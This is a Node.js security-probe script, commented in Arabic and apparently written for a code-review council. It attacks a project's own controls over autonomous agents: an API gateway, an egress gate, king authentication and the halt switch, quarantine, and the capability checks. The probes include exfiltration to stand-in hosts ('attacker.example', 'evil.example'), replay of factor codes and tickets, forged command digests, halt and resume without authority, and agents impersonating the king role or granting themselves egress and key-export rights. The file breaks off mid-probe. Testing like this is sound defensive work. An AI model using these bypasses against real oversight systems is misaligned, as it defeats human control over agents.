#!/usr/bin/env node
/**
 * مجسّات اختراق فعليّة — مجلس M11.05 الجولة 1، العضو B (Grok 4.6).
 * لا يطبع رمزاً ولا عاملاً ثانياً ولا مفتاحاً خاصّاً ولا سلسلة اتصال.
 * الحكم: نجح = المسلك وقع أثره؛ فشل = شُغّل ورُئي رفضه؛ لم_يجرب = تعذّر التشغيل.
 */
import { Buffer } from 'node:buffer';
import { generateKeyPairSync, randomBytes } from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import process from 'node:process';
import { fileURLToPath } from 'node:url';

import { ApiGateway, loadApiPolicy } from '../../../src/api/index.mjs';
import { createPoPClient } from '../../../src/api/pop-client.mjs';
import {
  KingAuthenticator,
  factorCodeForStep,
  loadKingAuthPolicy,
} from '../../../src/authn/index.mjs';
import { RoyalConsole, loadConsolePolicy } from '../../../src/console/index.mjs';
import { composeEnforcementChain } from '../../../src/core/composition-root.mjs';
import { createEgressGate } from '../../../src/egress/egress-gate.mjs';
import {
  IsolationError,
  ISOLATION_ERRORS,
  runIsolated,
} from '../../../src/execution/isolation.mjs';
import { TelegramBotChannel } from '../../../src/notifications/channels/telegram-bot.mjs';
import { MonitorAgent, loadMonitoringPolicy } from '../../../src/observability/index.mjs';
import { createMemoryRepositories } from '../../../src/persistence/composition.mjs';
import { createPolicyDecisionPoint } from '../../../src/policy/engine.mjs';
import { EnforcementPoint } from '../../../src/policy/enforcement-point.mjs';
import { loadPolicyBundle } from '../../../src/policy/loader.mjs';
import {
  CertificateAuthority,
  CommandLedger,
  CrownGateway,
  EventLog,
  HaltSwitch,
  KingIdentity,
  PersistentEventLog,
  createRoyalCommand,
} from '../../../src/root-of-trust/index.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(HERE, '../../..');
const OUT = path.join(HERE, 'm1105-r1-member-b-probe-results.json');
const CONFIG_DIR = path.join(ROOT, 'config');

/** @type {Array<Record<string, unknown>>} */
const results = [];

function codeOf(error) {
  if (error !== null && typeof error === 'object' && 'code' in error) {
    return String(/** @type {{ code: unknown }} */ (error).code);
  }
  return `بلا-رمز:${String(error)}`;
}

function memoryLog() {
  /** @type {Array<{ type: string, actor: string, payload: Record<string, unknown> }>} */
  const events = [];
  return {
    events,
    append(type, actor, payload) {
      events.push({ type, actor, payload: /** @type {Record<string, unknown>} */ (payload) });
    },
  };
}

/**
 * @param {string} id
 * @param {string} target
 * @param {string} path
 * @param {() => Promise<{ judgment: 'نجح' | 'فشل' | 'لم_يجرب', refusal?: string, note?: string, extra?: Record<string, unknown> }>} run
 */
async function probe(id, target, path, run) {
  const started = Date.now();
  try {
    const outcome = await run();
    results.push({
      id,
      target,
      path,
      judgment: outcome.judgment,
      refusal: outcome.refusal ?? null,
      note: outcome.note ?? null,
      extra: outcome.extra ?? null,
      ms: Date.now() - started,
    });
  } catch (error) {
    results.push({
      id,
      target,
      path,
      judgment: 'لم_يجرب',
      refusal: null,
      note: `استثناء غير متوقّع أثناء التشغيل: ${codeOf(error)}`,
      extra: { message: String(error instanceof Error ? error.message : error).slice(0, 240) },
      ms: Date.now() - started,
    });
  }
}

function tmpDir(prefix) {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}

const bundle = loadPolicyBundle();
const AUTHN_POLICY = loadKingAuthPolicy({ dir: CONFIG_DIR });
const CONSOLE_POLICY = loadConsolePolicy({ dir: CONFIG_DIR });
const API_POLICY = loadApiPolicy({ dir: CONFIG_DIR });
const MONITORING_POLICY = loadMonitoringPolicy({ dir: CONFIG_DIR });
const TRUSTED_DEVICE = AUTHN_POLICY.devices.find((entry) => entry.state === 'trusted');
if (TRUSTED_DEVICE === undefined) throw new Error('لا جهاز موثوق في وثيقة المصادقة');

function minister(patch = {}) {
  return {
    id: 'agent:minister-1',
    role: 'role:minister',
    kind: /** @type {const} */ ('human'),
    state: 'active',
    scope: 'org:interior',
    ...patch,
  };
}

function agentActor(patch = {}) {
  return {
    id: 'agent:worker-1',
    role: 'role:agent',
    kind: /** @type {const} */ ('autonomous'),
    state: 'active',
    scope: 'org:interior',
    capabilities: [],
    ...patch,
  };
}

function kingActor(patch = {}) {
  return {
    id: 'agent:king-claimed',
    role: 'role:king',
    kind: /** @type {const} */ ('human'),
    state: 'active',
    scope: 'org:interior',
    ...patch,
  };
}

function fakeDigest() {
  return 'a'.repeat(64);
}

function enforcement(log, extra = {}) {
  return new EnforcementPoint({
    decisionPoint: createPolicyDecisionPoint({ bundle }),
    log,
    requireIdentityGate: false,
    ...extra,
  });
}

function realApiGateway(log, { requirePoP = false } = {}) {
  const repositories = createMemoryRepositories();
  const identity = {
    id: 'agent:console-auditor',
    kind: 'service',
    state: 'active',
    role: MONITORING_POLICY.role,
    capabilities: ['action:read-registry', 'action:read-memory', 'action:read-audit'],
  };
  const agents = {
    get: async (id) => (id === identity.id ? identity : null),
  };
  const monitor = new MonitorAgent({
    policy: MONITORING_POLICY,
    repositories,
    agents: /** @type {never} */ (agents),
    log: /** @type {never} */ (log),
  });
  return new ApiGateway({
    policy: API_POLICY,
    log: /** @type {never} */ (log),
    agents: /** @type {never} */ (agents),
    monitor,
    enforcementPoint: enforcement(/** @type {never} */ (log)),
    requirePoP,
  });
}

function realm() {
  const directory = tmpDir('m1105-b-realm-');
  const logFile = path.join(directory, 'events.log');
  const log = new PersistentEventLog(logFile, { fsync: false });
  const king = new KingIdentity();
  const ca = new CertificateAuthority(king);
  const ledger = new CommandLedger(path.join(directory, 'commands.ledger'), { fsync: false });
  const haltSwitch = new HaltSwitch(path.join(directory, 'halt.directive'), king, {
    log,
    fsync: false,
  });
  const crown = new CrownGateway(king, ca, log, { commandLedger: ledger, haltSwitch });
  const factorSecret = randomBytes(32).toString('hex');
  /** @type {Record<string, string>} */
  const vault = {};
  for (const device of AUTHN_POLICY.devices) vault[device.factorRef] = factorSecret;
  const kingAuth = new KingAuthenticator({
    policy: /** @type {never} */ (AUTHN_POLICY),
    king,
    log,
    factorSecrets: {
      read: (name) => vault[name] ?? null,
    },
  });
  const console_ = new RoyalConsole({
    policy: CONSOLE_POLICY,
    gateway: realApiGateway(log),
    crown,
    haltSwitch,
    king,
    kingAuth,
    commandLedger: ledger,
    log,
  });
  const factorCode = (deltaSteps = 0, atMs = Date.now()) => {
    const { stepSeconds, digits, algorithm } = AUTHN_POLICY.secondFactor;
    return factorCodeForStep({
      secret: factorSecret,
      step: Math.floor(atMs / 1000 / stepSeconds) + deltaSteps,
      digits,
      algorithm,
    });
  };
  const authenticate = (request = {}) =>
    kingAuth.authenticate({
      actorId: request.actorId ?? king.id,
      deviceId: request.deviceId ?? TRUSTED_DEVICE.id,
      factorCode: request.factorCode ?? factorCode(),
    });
  const signed = (action, target, payload = {}) => {
    const royal = createRoyalCommand(action, target, payload);
    return {
      royalCommand: /** @type {Record<string, unknown>} */ (/** @type {unknown} */ (royal)),
      signature: king.sign(royal),
    };
  };
  const cleanup = () => {
    log.close?.();
    fs.rmSync(directory, { recursive: true, force: true });
  };
  return {
    console: console_,
    kingAuth,
    king,
    crown,
    haltSwitch,
    log,
    ledger,
    factorCode,
    factorSecret,
    authenticate,
    signed,
    cleanup,
    directory,
  };
}

// ── الهدف 1: سطح الواجهة ──────────────────────────────────────────────

await probe('API-01', 'سطح الواجهة', 'نداء بلا جلسة', async () => {
  const log = memoryLog();
  const gw = realApiGateway(log);
  try {
    await gw.call({ route: 'state.agents.count' });
    return { judgment: 'نجح', note: 'نداء بلا رمز جلسة نفذ' };
  } catch (error) {
    return {
      judgment: 'فشل',
      refusal: `src/api/session-store.mjs:${codeOf(error)}`,
      extra: { code: codeOf(error) },
    };
  }
});

await probe('API-02', 'سطح الواجهة', 'مسار غير معلن', async () => {
  const log = memoryLog();
  const gw = realApiGateway(log);
  const opened = await gw.openSession({ actorId: 'agent:console-auditor' });
  try {
    await gw.call({ route: 'secret.exfil', token: opened.token });
    return { judgment: 'نجح', note: 'مسار مخترع نفذ' };
  } catch (error) {
    return {
      judgment: 'فشل',
      refusal: `src/api/gateway.mjs:#callChecked:${codeOf(error)}`,
      extra: { code: codeOf(error) },
    };
  }
});

await probe('API-03', 'سطح الواجهة', 'فتح جلسة بلا إثبات حيازة والافتراض يلزم PoP', async () => {
  const log = memoryLog();
  const gw = realApiGateway(log, { requirePoP: true });
  try {
    await gw.openSession({ actorId: 'agent:console-auditor' });
    return { judgment: 'نجح', note: 'فُتحت جلسة بلا PoP رغم requirePoP الافتراضي' };
  } catch (error) {
    return {
      judgment: 'فشل',
      refusal: `src/api/session-store.mjs:${codeOf(error)}`,
      extra: { code: codeOf(error) },
    };
  }
});

await probe('API-04', 'سطح الواجهة', 'نداء بجلسة صحيحة بلا PoP على كل طلب', async () => {
  const log = memoryLog();
  const gw = realApiGateway(log, { requirePoP: true });
  const { publicKey, privateKey } = generateKeyPairSync('ed25519');
  const pubPem = publicKey.export({ type: 'spki', format: 'pem' });
  gw.registerPoPKey(
    'agent:console-auditor',
    typeof pubPem === 'string' ? pubPem : pubPem.toString(),
  );
  const client = createPoPClient({ privateKey });
  const opened = await gw.openSession(client.signOpen('agent:console-auditor'));
  try {
    await gw.call({ route: 'state.agents.count', token: opened.token });
    return { judgment: 'نجح', note: 'نداء بلا PoP على الطلب نفذ بعد فتح جلسة بـPoP' };
  } catch (error) {
    return {
      judgment: 'فشل',
      refusal: `src/api/gateway.mjs:verifyPoP:${codeOf(error)}`,
      extra: { code: codeOf(error) },
    };
  }
});

await probe('API-05', 'سطح الواجهة', 'خلط مسار بمعرّف مخترع بعد فتح جلسة', async () => {
  const log = memoryLog();
  const gw = realApiGateway(log);
  const opened = await gw.openSession({ actorId: 'agent:console-auditor' });
  try {
    await gw.call({ route: 'state.agents.count/../halt', token: opened.token });
    return { judgment: 'نجح', note: 'التباس مسار نفذ' };
  } catch (error) {
    return {
      judgment: 'فشل',
      refusal: `src/api/gateway.mjs:${codeOf(error)}`,
      extra: { code: codeOf(error) },
    };
  }
});

// ── الهدف 2: بوابة الخروج ─────────────────────────────────────────────

const DESTINATIONS = [
  {
    id: 'federation:audit-mirror',
    uri: 'https://audit-mirror.federation.example/ingest',
    purpose: 'مرآة تدقيق معتمدة',
  },
  {
    id: 'federation:archive',
    uri: 'https://archive.federation.example/ingest',
    purpose: 'أرشيف معتمد',
  },
  {
    id: 'evil:exfil',
    uri: 'https://evil.example/collect',
    purpose: 'جهة أضافها المجس وليست في سياسة السماح',
  },
];

function egressSetup() {
  const log = memoryLog();
  /** @type {Array<{ destination: { id: string }, bytes: number }>} */
  const sent = [];
  const point = enforcement(log);
  const gate = createEgressGate({
    enforcementPoint: point,
    log,
    destinations: DESTINATIONS,
    transport: async (record) => {
      sent.push(/** @type {{ destination: { id: string }, bytes: number }} */ (record));
      return { status: 202 };
    },
  });
  return { gate, log, sent, point };
}

await probe('EGRESS-01', 'بوابة الخروج', 'جهة غير معلنة في سجل البوابة', async () => {
  const { gate, sent } = egressSetup();
  try {
    await gate.send({
      actor: minister(),
      destination: 'https://attacker.example/exfil',
      payload: 'X',
      classification: 'public',
      resourceId: 'probe:1',
    });
    return { judgment: 'نجح', note: `نُقل بايت إلى جهة مجهولة؛ sent=${sent.length}` };
  } catch (error) {
    return {
      judgment: 'فشل',
      refusal: `src/egress/egress-gate.mjs:${codeOf(error)}`,
      extra: { code: codeOf(error), sent: sent.length },
    };
  }
});

await probe('EGRESS-02', 'بوابة الخروج', 'جهة في سجل البوابة وخارج سياسة السماح', async () => {
  const { gate, sent } = egressSetup();
  try {
    await gate.send({
      actor: minister(),
      destination: 'evil:exfil',
      payload: 'X',
      classification: 'public',
      resourceId: 'probe:2',
    });
    return { judgment: 'نجح', note: `نُقل بايت إلى evil:exfil؛ sent=${sent.length}` };
  } catch (error) {
    return {
      judgment: 'فشل',
      refusal: `src/egress/egress-gate.mjs:${codeOf(error)}`,
      extra: { code: codeOf(error), sent: sent.length },
    };
  }
});

await probe(
  'EGRESS-03',
  'بوابة الخروج',
  'كذب التصنيف: sensitive يُعلَن public إلى جهة معتمدة',
  async () => {
    const { gate, sent } = egressSetup();
    try {
      const outcome = await gate.send({
        actor: minister(),
        destination: 'federation:audit-mirror',
        payload: 'S',
        classification: 'public',
        resourceId: 'secret:crown',
      });
      return {
        judgment: 'نجح',
        note: 'البوابة نقلت بايتاً بتصنيف يعلنه المنادي لا تفحصه',
        extra: { bytes: outcome.bytes, sent: sent.length },
      };
    } catch (error) {
      return {
        judgment: 'فشل',
        refusal: `src/egress/egress-gate.mjs:${codeOf(error)}`,
        extra: { code: codeOf(error) },
      };
    }
  },
);

await probe('EGRESS-04', 'بوابة الخروج', 'فاعل وكيل يُخرج إلى جهة معتمدة', async () => {
  const { gate, sent } = egressSetup();
  try {
    await gate.send({
      actor: agentActor(),
      destination: 'federation:archive',
      payload: 'X',
      classification: 'internal',
      resourceId: 'probe:4',
    });
    return { judgment: 'نجح', note: `وكيل أخرج بايتاً؛ sent=${sent.length}` };
  } catch (error) {
    return {
      judgment: 'فشل',
      refusal: `src/egress/egress-gate.mjs:${codeOf(error)}`,
      extra: { code: codeOf(error), sent: sent.length },
    };
  }
});

await probe(
  'EGRESS-05',
  'بوابة الخروج',
  'تجاوز البوابة: fetch مباشر من قناة telegram_bot إلى منصِت محلي',
  async () => {
    const received = { bytes: 0, hit: false };
    const server = http.createServer((req, res) => {
      let body = '';
      req.on('data', (chunk) => {
        body += chunk;
      });
      req.on('end', () => {
        received.hit = true;
        received.bytes = Buffer.byteLength(body, 'utf8');
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true, result: { message_id: 1 } }));
      });
    });
    await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
    const addr = /** @type {{ port: number }} */ (server.address());
    const prevBase = process.env.TELEGRAM_API_BASE;
    process.env.TELEGRAM_API_BASE = `http://127.0.0.1:${addr.port}`;
    try {
      const channel = TelegramBotChannel({ getToken: () => 'probe-dummy-token' });
      const outcome = await channel.send(
        {
          ownerId: 'probe',
          subject: 'p',
          body: 'X',
          sentAtMs: Date.now(),
        },
        '0',
      );
      if (received.hit && received.bytes > 0) {
        return {
          judgment: 'نجح',
          note: 'قناة الإشعار استدعت fetch دون المرور ببوابة الخروج',
          extra: { state: outcome.state, bytes: received.bytes },
        };
      }
      return {
        judgment: 'فشل',
        refusal: 'telegram-bot.mjs: لم يصل بايت إلى المنصِت',
        extra: { state: outcome.state, hit: received.hit },
      };
    } finally {
      if (prevBase === undefined) delete process.env.TELEGRAM_API_BASE;
      else process.env.TELEGRAM_API_BASE = prevBase;
      await new Promise((resolve) => server.close(resolve));
    }
  },
);

await probe('EGRESS-06', 'بوابة الخروج', 'عزل تنفيذي: حمولة تحاول الخروج الشبكي', async () => {
  const directory = tmpDir('m1105-b-iso-');
  const workdir = directory;
  const writableDir = path.join(directory, 'out');
  fs.mkdirSync(writableDir);
  const job = path.join(workdir, 'job.mjs');
  fs.writeFileSync(
    job,
    "import net from 'node:net'; const s=net.connect({host:'1.1.1.1',port:80},()=>process.exit(0)); s.on('error',()=>process.exit(2)); setTimeout(()=>process.exit(3),2000);\n",
  );
  const log = memoryLog();
  try {
    const result = await runIsolated({
      command: process.execPath,
      args: [job],
      workdir,
      writableDir,
      timeoutMs: 4000,
      memoryLimitMb: 256,
      maxFileSizeMb: 4,
      processLimit: 8,
      actor: 'agent:probe-isolation',
      log,
    });
    if (result.code === ISOLATION_ERRORS.UNSUPPORTED) {
      return {
        judgment: 'لم_يجرب',
        note: 'العزل غير مدعوم في هذه النواة؛ الحمولة لم تبدأ',
        extra: { code: result.code },
      };
    }
    if (result.ok === true || result.exitCode === 0) {
      return {
        judgment: 'نجح',
        note: 'حمولة معزولة اتصلت بالشبكة أو خرجت بنجاح',
        extra: { exitCode: result.exitCode, code: result.code },
      };
    }
    return {
      judgment: 'فشل',
      refusal: `src/execution/isolation.mjs:${result.code ?? 'exit:' + String(result.exitCode)}`,
      extra: { exitCode: result.exitCode, code: result.code, ok: result.ok },
    };
  } catch (error) {
    if (error instanceof IsolationError && error.code === ISOLATION_ERRORS.UNSUPPORTED) {
      return {
        judgment: 'لم_يجرب',
        note: 'العزل غير مدعوم في هذه النواة',
        extra: { code: codeOf(error) },
      };
    }
    throw error;
  } finally {
    fs.rmSync(directory, { recursive: true, force: true });
  }
});

// ── الهدف 3: مصادقة الملك والتعافي ومنع الإعادة ───────────────────────

await probe('KING-01', 'مصادقة الملك', 'إعادة استعمال رمز العامل في العملية نفسها', async () => {
  const r = realm();
  try {
    const code = r.factorCode();
    await r.kingAuth.authenticate({
      actorId: r.king.id,
      deviceId: TRUSTED_DEVICE.id,
      factorCode: code,
    });
    try {
      await r.kingAuth.authenticate({
        actorId: r.king.id,
        deviceId: TRUSTED_DEVICE.id,
        factorCode: code,
      });
      return { judgment: 'نجح', note: 'رمز عامل مستهلك فُتحت به جلسة ثانية في العملية نفسها' };
    } catch (error) {
      return {
        judgment: 'فشل',
        refusal: `src/authn/king-auth.mjs:authenticate:${codeOf(error)}`,
        extra: { code: codeOf(error) },
      };
    }
  } finally {
    r.cleanup();
  }
});

await probe(
  'KING-02',
  'مصادقة الملك',
  'إعادة استعمال رمز العامل بعد إنشاء مصادق جديد (محاكاة إعادة التشغيل)',
  async () => {
    const r = realm();
    try {
      const code = r.factorCode();
      await r.kingAuth.authenticate({
        actorId: r.king.id,
        deviceId: TRUSTED_DEVICE.id,
        factorCode: code,
      });
      /** @type {Record<string, string>} */
      const vault = {};
      for (const device of AUTHN_POLICY.devices) vault[device.factorRef] = r.factorSecret;
      const restarted = new KingAuthenticator({
        policy: /** @type {never} */ (AUTHN_POLICY),
        king: r.king,
        log: r.log,
        factorSecrets: { read: (name) => vault[name] ?? null },
      });
      try {
        const second = await restarted.authenticate({
          actorId: r.king.id,
          deviceId: TRUSTED_DEVICE.id,
          factorCode: code,
        });
        return {
          judgment: 'نجح',
          note: 'رمز عامل مستهلك قُبل بعد إنشاء مصادق جديد داخل نافذة الخطوة',
          extra: { opened: Boolean(second?.sessionRef) },
        };
      } catch (error) {
        return {
          judgment: 'فشل',
          refusal: `src/authn/king-auth.mjs:authenticate:${codeOf(error)}`,
          extra: { code: codeOf(error) },
        };
      }
    } finally {
      r.cleanup();
    }
  },
);

await probe(
  'KING-03',
  'مصادقة الملك',
  'جلسة قراءة من الواجهة تُقدَّم كجلسة سيادية لأمر halt',
  async () => {
    const r = realm();
    try {
      const reader = await realApiGateway(r.log).openSession({ actorId: 'agent:console-auditor' });
      try {
        await r.console.issue({
          sovereignSession: reader.token,
          command: 'cmd:halt',
          ...r.signed('stop-state', 'state:sovereign'),
        });
        return { judgment: 'نجح', note: 'أمر إيقاف نفذ بجلسة قراءة' };
      } catch (error) {
        const halted = r.haltSwitch.read().state === 'halted';
        return {
          judgment: halted ? 'نجح' : 'فشل',
          refusal: halted ? null : `src/console/royal-console.mjs:issue:${codeOf(error)}`,
          extra: { code: codeOf(error), haltState: r.haltSwitch.read().state },
        };
      }
    } finally {
      r.cleanup();
    }
  },
);

await probe('KING-04', 'مصادقة الملك', 'أمر halt بلا جلسة سيادية أصلاً', async () => {
  const r = realm();
  try {
    try {
      await r.console.issue({
        command: 'cmd:halt',
        ...r.signed('stop-state', 'state:sovereign'),
      });
      return { judgment: 'نجح', note: 'إيقاف بلا جلسة قوية' };
    } catch (error) {
      const halted = r.haltSwitch.read().state === 'halted';
      return {
        judgment: halted ? 'نجح' : 'فشل',
        refusal: halted ? null : `src/console/royal-console.mjs:issue:${codeOf(error)}`,
        extra: { code: codeOf(error), haltState: r.haltSwitch.read().state },
      };
    }
  } finally {
    r.cleanup();
  }
});

await probe('KING-05', 'مصادقة الملك', 'مسار التعافي halt-resume بلا جلسة قوية', async () => {
  const r = realm();
  try {
    try {
      await r.console.issue({
        command: 'cmd:resume',
        ...r.signed('resume-state', 'state:sovereign'),
      });
      return { judgment: 'نجح', note: 'استئناف بلا جلسة قوية' };
    } catch (error) {
      return {
        judgment: 'فشل',
        refusal: `src/console/royal-console.mjs:issue:${codeOf(error)}`,
        extra: { code: codeOf(error) },
      };
    }
  } finally {
    r.cleanup();
  }
});

await probe(
  'KING-06',
  'مصادقة الملك',
  'إعادة أمر تعافٍ موقَّع بعد قبوله (منع الإعادة)',
  async () => {
    const r = realm();
    try {
      const session = await r.authenticate();
      r.haltSwitch.halt('probe-setup');
      const signed = r.signed('resume-state', 'state:sovereign');
      try {
        await r.console.issue({
          sovereignSession: session.token,
          command: 'cmd:resume',
          ...signed,
        });
      } catch (error) {
        return {
          judgment: 'لم_يجرب',
          note: `القبول الأول للتعافي رُفض قبل قياس الإعادة: ${codeOf(error)}`,
          extra: { code: codeOf(error), haltState: r.haltSwitch.read().state },
        };
      }
      try {
        await r.console.issue({
          sovereignSession: session.token,
          command: 'cmd:resume',
          ...signed,
        });
        return { judgment: 'نجح', note: 'أمر تعافٍ أُعيد تنفيذه بالمعرّف نفسه' };
      } catch (error) {
        return {
          judgment: 'فشل',
          refusal: `src/console/royal-console.mjs:#acceptRecovery:${codeOf(error)}`,
          extra: { code: codeOf(error) },
        };
      }
    } finally {
      r.cleanup();
    }
  },
);

await probe(
  'KING-07',
  'مصادقة الملك',
  'HaltSwitch.halt مباشرة بلا ديوان ولا أمر ملكي',
  async () => {
    const directory = tmpDir('m1105-b-halt-');
    const log = new PersistentEventLog(path.join(directory, 'events.log'), { fsync: false });
    const king = new KingIdentity();
    const haltSwitch = new HaltSwitch(path.join(directory, 'halt.directive'), king, {
      log,
      fsync: false,
    });
    try {
      const before = haltSwitch.read().state;
      haltSwitch.halt('probe-direct');
      const after = haltSwitch.read().state;
      if (before !== 'halted' && after === 'halted') {
        return {
          judgment: 'نجح',
          note: 'نداء HaltSwitch.halt أوقف الدولة بلا أمر ملكي عبر الديوان',
          extra: { before, after },
        };
      }
      return {
        judgment: 'فشل',
        refusal: 'halt-switch.mjs:halt لم يغيّر الحالة',
        extra: { before, after },
      };
    } finally {
      log.close?.();
      fs.rmSync(directory, { recursive: true, force: true });
    }
  },
);

await probe(
  'KING-08',
  'مصادقة الملك',
  'تفويض stop-state بلا أمر ملكي عبر نقطة الإنفاذ',
  async () => {
    const log = memoryLog();
    const point = enforcement(log);
    const { decision, token } = await point.authorize({
      actor: kingActor(),
      action: 'stop-state',
      resource: { type: 'state', id: 'sovereign' },
    });
    if (decision.allowed && token !== null) {
      return {
        judgment: 'نجح',
        note: 'نقطة الإنفاذ أصدرت تذكرة لفعل فوق العتبة بلا أمر ملكي',
        extra: { code: decision.code },
      };
    }
    return {
      judgment: 'فشل',
      refusal: `src/policy/engine.mjs:evaluate:${decision.code}`,
      extra: { code: decision.code, allowed: decision.allowed },
    };
  },
);

await probe(
  'KING-09',
  'مصادقة الملك',
  'تفويض stop-state بملخص sha256 مزيف على صورة صحيحة',
  async () => {
    const log = memoryLog();
    const point = enforcement(log);
    const { decision, token } = await point.authorize({
      actor: kingActor(),
      action: 'stop-state',
      resource: { type: 'state', id: 'sovereign' },
      royalCommandId: 'cmd:forged-probe',
      royalCommandDigest: fakeDigest(),
    });
    if (decision.allowed && token !== null) {
      return {
        judgment: 'نجح',
        note: 'المحرّك قبل معرّفاً وملخصاً على صورة sha256 دون تحقق توقيع التاج',
        extra: { code: decision.code, requiresRoyalCommand: decision.requiresRoyalCommand },
      };
    }
    return {
      judgment: 'فشل',
      refusal: `src/policy/engine.mjs:evaluate:${decision.code}`,
      extra: { code: decision.code },
    };
  },
);

// ── الهدف 4: عزل الوكلاء ومنع التصعيد ────────────────────────────────

await probe('ISO-01', 'عزل الوكلاء', 'وكيل يدّعي دور الملك بلا بوابة هوية', async () => {
  const log = memoryLog();
  const point = enforcement(log);
  const { decision, token } = await point.authorize({
    actor: agentActor({ role: 'role:king', id: 'agent:impostor' }),
    action: 'read-data',
    resource: { type: 'data', id: 'doc:1' },
  });
  if (decision.allowed && token !== null) {
    return {
      judgment: 'نجح',
      note: 'فاعل وصف نفسه ملكاً ونال إذناً لأن requireIdentityGate=false',
      extra: { code: decision.code, policyId: decision.policyId },
    };
  }
  return {
    judgment: 'فشل',
    refusal: `src/policy/enforcement-point.mjs:${decision.code}`,
    extra: { code: decision.code },
  };
});

await probe('ISO-02', 'عزل الوكلاء', 'وكيل يدّعي دور الملك عبر سلسلة التركيب الرسمية', async () => {
  const log = new EventLog();
  const chain = composeEnforcementChain({ log });
  const registered = await chain.registry.register({
    name: 'impostor',
    role: 'role:agent',
    capabilities: ['action:read-registry'],
  });
  const { decision, token } = await chain.enforcementPoint.authorize({
    actor: {
      id: registered.id,
      role: 'role:king',
      kind: 'human',
      state: 'active',
      capabilities: ['action:stop-state'],
    },
    action: 'read-registry',
    resource: { type: 'registry', id: 'agents' },
  });
  if (
    decision.allowed &&
    token !== null &&
    decision.matched?.some((m) => String(m.id).includes('king'))
  ) {
    return {
      judgment: 'نجح',
      note: 'السلسلة الرسمية قيّمت ادّعاء الدور لا هوية السجل',
      extra: { code: decision.code, policyId: decision.policyId },
    };
  }
  if (decision.allowed && token !== null) {
    return {
      judgment: 'فشل',
      refusal: `src/core/composition-root.mjs:identity-gate استبدلت الفاعل؛ القرار=${decision.code}`,
      extra: { code: decision.code, policyId: decision.policyId, roleReplaced: true },
    };
  }
  return {
    judgment: 'فشل',
    refusal: `src/policy/enforcement-point.mjs:${decision.code}`,
    extra: { code: decision.code },
  };
});

await probe(
  'ISO-03',
  'عزل الوكلاء',
  'حجر في الذاكرة ثم تفويض عبر نقطة الإنفاذ الرسمية',
  async () => {
    const log = new EventLog();
    const chain = composeEnforcementChain({ log });
    const registered = await chain.registry.register({
      name: 'quarantined-agent',
      role: 'role:agent',
      capabilities: ['action:read-registry', 'action:write-data'],
    });
    chain.quarantine.report({ kind: 'model-fingerprint-mismatch', subject: registered.id });
    const quarantined = chain.quarantine.isQuarantined(registered.id);
    const { decision, token } = await chain.enforcementPoint.authorize({
      actor: { id: registered.id, role: 'role:agent', kind: 'autonomous', state: 'active' },
      action: 'read-registry',
      resource: { type: 'registry', id: 'agents' },
    });
    if (quarantined && decision.allowed && token !== null) {
      return {
        judgment: 'نجح',
        note: 'الحاجب حجر الفاعل في الذاكرة ونقطة الإنفاذ أذنت لأن isQuarantined غير موصول',
        extra: { code: decision.code, isolatedCallback: chain.quarantine.isolate === null },
      };
    }
    if (!quarantined) {
      return { judgment: 'لم_يجرب', note: 'الحاجب لم يحجر الفاعل بعد إشارة واحدة' };
    }
    return {
      judgment: 'فشل',
      refusal: `src/policy/enforcement-point.mjs:${decision.code}`,
      extra: { code: decision.code, quarantined },
    };
  },
);

await probe(
  'ISO-04',
  'عزل الوكلاء',
  'وكيل بلا قدرات يكتب بيانات لأن السياسة تطابق الدور',
  async () => {
    const log = memoryLog();
    const point = enforcement(log);
    const { decision, token } = await point.authorize({
      actor: agentActor({ capabilities: [] }),
      action: 'write-data',
      resource: { type: 'data', id: 'doc:1' },
    });
    if (decision.allowed && token !== null) {
      return {
        judgment: 'نجح',
        note: 'السياسة pol:write-data-operators تطابق الدور ولا تفحص actor.capabilities',
        extra: { code: decision.code, policyId: decision.policyId },
      };
    }
    return {
      judgment: 'فشل',
      refusal: `src/policy/engine.mjs:${decision.code}`,
      extra: { code: decision.code },
    };
  },
);

await probe('ISO-05', 'عزل الوكلاء', 'تذكرة فاعل تُستعمل لفاعل آخر', async () => {
  const log = memoryLog();
  const point = enforcement(log);
  const a = await point.authorize({
    actor: minister(),
    action: 'read-registry',
    resource: { type: 'registry', id: 'agents' },
  });
  if (!a.decision.allowed || a.token === null) {
    return { judgment: 'لم_يجرب', note: `لم تصدر تذكرة للأول: ${a.decision.code}` };
  }
  try {
    point.verify(a.token, {
      actorId: 'agent:colluder',
      action: 'read-registry',
      resourceKey: 'registry:agents',
    });
    return { judgment: 'نجح', note: 'تذكرة وزير قُبلت لفاعل آخر' };
  } catch (error) {
    return {
      judgment: 'فشل',
      refusal: `src/policy/enforcement-point.mjs:verify:${codeOf(error)}`,
      extra: { code: codeOf(error) },
    };
  }
});

await probe(
  'ISO-06',
  'عزل الوكلاء',
  'إعادة استعمال التذكرة نفسها (تواطؤ بإعادة تقديم)',
  async () => {
    const log = memoryLog();
    const point = enforcement(log);
    const a = await point.authorize({
      actor: minister(),
      action: 'read-registry',
      resource: { type: 'registry', id: 'agents' },
    });
    if (!a.decision.allowed || a.token === null) {
      return { judgment: 'لم_يجرب', note: `لم تصدر تذكرة: ${a.decision.code}` };
    }
    point.verify(a.token, {
      actorId: minister().id,
      action: 'read-registry',
      resourceKey: 'registry:agents',
    });
    try {
      point.verify(a.token, {
        actorId: minister().id,
        action: 'read-registry',
        resourceKey: 'registry:agents',
      });
      return { judgment: 'نجح', note: 'التذكرة استُهلكت مرّتين' };
    } catch (error) {
      return {
        judgment: 'فشل',
        refusal: `src/policy/enforcement-point.mjs:verify:${codeOf(error)}`,
        extra: { code: codeOf(error) },
      };
    }
  },
);

await probe(
  'ISO-07',
  'عزل الوكلاء',
  'وكيل يمنح نفسه قدرات عبر وصف الطلب مع بوابة هوية',
  async () => {
    const log = new EventLog();
    const chain = composeEnforcementChain({ log });
    const registered = await chain.registry.register({
      name: 'limited',
      role: 'role:agent',
      capabilities: ['action:read-registry'],
    });
    const verdict = await chain.identityGate.verify(registered.id);
    const claimed = ['action:read-registry', 'action:external-egress', 'action:export-keys'];
    const effective = verdict.actor?.capabilities ?? [];
    const injected = claimed.filter((cap) => !effective.includes(cap));
    if (verdict.ok && injected.length > 0 && effective.includes('action:external-egress')) {
      return { judgment: 'نجح', note: 'القدرات المدّعاة بقيت بعد بوابة الهوية' };
    }
    return {
      judgment: 'فشل',
